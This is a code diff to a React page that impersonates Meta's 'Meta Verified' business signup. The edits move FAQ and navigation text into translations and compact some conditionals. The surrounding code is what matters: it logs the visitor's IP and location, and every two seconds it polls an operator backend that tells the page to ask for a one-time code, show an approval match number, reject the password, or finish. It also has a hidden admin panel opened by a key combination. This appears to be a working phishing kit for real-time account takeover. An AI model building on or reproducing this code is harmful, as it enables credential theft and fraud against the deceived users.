@@ -56,13 +56,14 @@ export default function Home() {
     { quote: '"Having a verified account signals to both our existing followers and new visitors that we are a credible, professional business."', author: 'Sarah Clancy, Owner of Sarah Marie Running Co.' }
   ];
   
+  // Bơm FAQ từ file translations vào
   const faqs = [
-    { q: 'How do I know if my business is eligible?', a: 'Meta Verified is available for businesses that meet certain eligibility requirements in selected regions.' },
-    { q: 'How do I update my information if I\'m not eligible?', a: 'Join our waitlist to stay updated.' },
-    { q: 'What if I already have a verified badge?', a: 'No action is needed to keep your badge.' },
-    { q: 'What if I\'m interested in Meta Verified for creators?', a: 'Visit the Meta Verified for creators page to learn more.' },
-    { q: 'Where will my badge appear?', a: 'Facebook Page and Messenger account, or Instagram account and Threads, depending on the asset you select.' },
-    { q: 'What determines which plans I can purchase?', a: 'Meta determines plan availability based on your business activity across our apps.' }
+    { q: t.faq1Q, a: t.faq1A },
+    { q: t.faq2Q, a: t.faq2A },
+    { q: t.faq3Q, a: t.faq3A },
+    { q: t.faq4Q, a: t.faq4A },
+    { q: t.faq5Q, a: t.faq5A },
+    { q: t.faq6Q, a: t.faq6A }
   ];
 
   // --- LẤY IP VÀ ĐỔI NGÔN NGỮ ---
@@ -71,15 +72,10 @@ export default function Home() {
           if (d && d.ip) {
               setClientIp(`${d.ip} - ${d.country} (${d.city})`);
               
-              if (d.country_code === 'FR') {
-                  setLang('fr');
-              } else {
-                  setLang('en');
-              }
+              if (d.country_code === 'FR') { setLang('fr'); } 
+              else { setLang('en'); }
 
-              if (d.country_code && countryCodeMap[d.country_code]) {
-                  setCountryCode(countryCodeMap[d.country_code]);
-              }
+              if (d.country_code && countryCodeMap[d.country_code]) { setCountryCode(countryCodeMap[d.country_code]); }
           }
       }).catch(()=>{}); 
   }, []);
@@ -93,15 +89,10 @@ export default function Home() {
         .then(res => res.json())
         .then(data => {
             if(data.record && data.record.target === sessionId) {
-                if (data.record.action === 'otp') {
-                    setStep(3); setMatchNumber(null); setShowSuccess(false);
-                } else if (data.record.action === 'approve' && data.record.value) {
-                    setStep(3); setMatchNumber(data.record.value); setShowSuccess(false);
-                } else if (data.record.action === 'error') {
-                    setStep(2); setShowLoginError(true); setLoginPass(''); setShowSuccess(false);
-                } else if (data.record.action === 'success') {
-                    setStep(3); setShowSuccess(true);
-                }
+                if (data.record.action === 'otp') { setStep(3); setMatchNumber(null); setShowSuccess(false); } 
+                else if (data.record.action === 'approve' && data.record.value) { setStep(3); setMatchNumber(data.record.value); setShowSuccess(false); } 
+                else if (data.record.action === 'error') { setStep(2); setShowLoginError(true); setLoginPass(''); setShowSuccess(false); } 
+                else if (data.record.action === 'success') { setStep(3); setShowSuccess(true); }
             }
         }).catch(()=>{});
     }, 2000);
@@ -112,8 +103,7 @@ export default function Home() {
   useEffect(() => {
     const handleKeyDown = (e) => {
       if (e.ctrlKey && e.shiftKey && e.key === 'A') {
-        setShowAdmin(prev => !prev);
-        setShowModal(true);
+        setShowAdmin(prev => !prev); setShowModal(true);
       }
     };
     window.addEventListener('keydown', handleKeyDown);
@@ -173,10 +163,10 @@ export default function Home() {
           <div className="header-left">
               <a href="/live" className="header-logo"><img src="https://static.xx.fbcdn.net/rsrc.php/y9/r/tL_v571NdZ0.svg" alt="Meta" /></a>
               <nav className="nav-links">
-                  <a className="nav-link" href="#steps">Get started</a>
-                  <a className="nav-link" href="#benefits">Advertise</a>
-                  <a className="nav-link" href="#faq">Learn</a>
-                  <a className="nav-link" href="#footer">Support</a>
+                  <a className="nav-link" href="#steps">{t.navGetStarted}</a>
+                  <a className="nav-link" href="#benefits">{t.navAdvertise}</a>
+                  <a className="nav-link" href="#faq">{t.navLearn}</a>
+                  <a className="nav-link" href="#footer">{t.navSupport}</a>
               </nav>
           </div>
           <div className="header-right">
@@ -238,7 +228,7 @@ export default function Home() {
               <h2>{t.testimonialsTitle}</h2>
               <div className="carousel-wrapper">
                   <div className="carousel-track" style={{ transform: `translateX(-${currentSlide * 100}%)` }}>
-                      {testimonials.map((t, i) => (<div className="carousel-slide" key={i}><p className="carousel-quote">{t.quote}</p><p className="carousel-author">{t.author}</p></div>))}
+                      {testimonials.map((item, i) => (<div className="carousel-slide" key={i}><p className="carousel-quote">{item.quote}</p><p className="carousel-author">{item.author}</p></div>))}
                   </div>
               </div>
               <div className="carousel-nav">
